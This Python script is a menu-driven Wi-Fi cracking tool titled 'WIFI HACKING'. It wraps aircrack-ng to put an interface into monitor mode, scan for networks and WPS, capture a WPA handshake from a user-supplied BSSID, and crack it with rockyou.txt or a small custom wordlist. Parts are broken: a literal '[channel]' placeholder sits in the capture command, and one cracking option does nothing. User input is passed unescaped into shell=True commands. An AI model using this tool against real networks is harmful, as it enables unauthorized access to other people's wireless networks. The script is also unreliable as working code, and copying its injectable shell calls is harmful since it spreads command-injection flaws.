import subprocess

def start_monitor_mode(interface):
    """Start monitor mode on the specified interface."""
    subprocess.run(f"sudo airmon-ng start {interface}", shell=True)
    print(f"Monitor mode started on {interface}.")

def stop_monitor_mode(interface):
    """Stop monitor mode on the specified interface."""
    subprocess.run(f"sudo airmon-ng stop {interface}", shell=True)
    print(f"Monitor mode stopped on {interface}.")

def scan_networks():
    """Scan for available networks."""
    subprocess.run("sudo airodump-ng wlan0mon", shell=True)

def get_handshake(target):
    """Capture handshake from the target."""
    subprocess.run(f"sudo airodump-ng -c [channel] --bssid {target} -w handshake wlan0mon", shell=True)
    print("Handshake capturing...")

def create_wordlist():
    """Create a simple wordlist."""
    wordlist = ["password123", "12345678", "letmein"]  # Extend this list as needed
    with open("custom_wordlist.txt", "w") as f:
        for word in wordlist:
            f.write(f"{word}\n")
    print("Custom wordlist created.")

def install_wireless_tools():
    """Install wireless tools (assuming Ubuntu/Debian)."""
    subprocess.run("sudo apt-get install aircrack-ng", shell=True)
    print("Wireless tools installed.")

def scan_for_wps_networks():
    """Scan for WPS-enabled networks."""
    subprocess.run("sudo airodump-ng --wps wlan0mon", shell=True)

def crack_handshake_with_rockyou():
    """Crack handshake using rockyou.txt."""
    subprocess.run("aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake.cap", shell=True)

def crack_handshake_with_wordlist():
    """Crack handshake with custom wordlist."""
    subprocess.run("aircrack-ng -w custom_wordlist.txt handshake.cap", shell=True)

def crack_handshake_without_wordlist():
    """Attempt to crack without a wordlist (using other methods)."""
    print("Attempting to crack handshake using alternative methods...")

def main():
    print("#############################")
    print("# WIFI HACKING by MIRAJ SANKDECHA #")
    print("#############################\n")

    while True:
        print("\n1) Start monitor mode")
        print("2) Stop monitor mode")
        print("3) Scan Networks")
        print("4) Getting Handshake")
        print("5) Create wordlist")
        print("6) Install Wireless tools")
        print("7) Scan for WPS Networks")
        print("8) Crack Handshake with rockyou.txt")
        print("9) Crack Handshake with custom wordlist")
        print("10) Crack Handshake without wordlist")
        print("11) Exitt")
        
        choice = input("Select an option: ")

        if choice == '1':
            interface = input("Enter the interface (e.g., wlan0): ")
            start_monitor_mode(interface)
        elif choice == '2':
            interface = input("Enter the interface (e.g., wlan0): ")
            stop_monitor_mode(interface)
        elif choice == '3':
            scan_networks()
        elif choice == '4':
            target = input("Enter the target BSSID: ")
            get_handshake(target)
        elif choice == '5':
            create_wordlist()
        elif choice == '6':
            install_wireless_tools()
        elif choice == '7':
            scan_for_wps_networks()
        elif choice == '8':
            crack_handshake_with_rockyou()
        elif choice == '9':
            crack_handshake_with_wordlist()
        elif choice == '10':
            crack_handshake_without_wordlist()
        elif choice == '11':
            print("Exiting...")
            break
        else:
            print("Invalid choice, please try again.")

if __name__ == "__main__":
    main()
